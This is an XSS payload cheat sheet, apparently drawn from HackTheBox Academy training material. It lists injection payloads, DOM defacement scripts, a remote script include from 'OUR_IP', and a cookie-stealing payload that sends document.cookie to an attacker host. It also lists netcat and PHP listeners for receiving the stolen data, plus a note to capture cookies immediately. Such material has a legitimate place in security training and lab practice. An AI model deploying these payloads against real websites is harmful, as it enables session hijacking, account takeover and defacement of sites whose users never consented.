# Cross-Site Scripting (XSS)

Goal: Execute JavaScript in victim’s browser.

---

# Basic Payloads

<script>alert(window.origin)</script>

<plaintext>

<script>print()</script>

<img src="" onerror=alert(window.origin)>

---

# DOM Manipulation

<script>document.body.style.background = "#141d2b"</script>

<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

<script>document.title = 'HackTheBox Academy'</script>

<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>

<script>document.getElementById('urlform').remove();</script>

---

# Load External Script

<script src="http://OUR_IP/script.js"></script>

---

# Cookie Exfiltration

<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>

---

# XSS Tools

python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

sudo nc -lvnp 80

sudo php -S 0.0.0.0:80

---

# Tactical Notes

- Test reflected → stored → DOM XSS.
- Use external script for complex payloads.
- Capture cookies immediately.
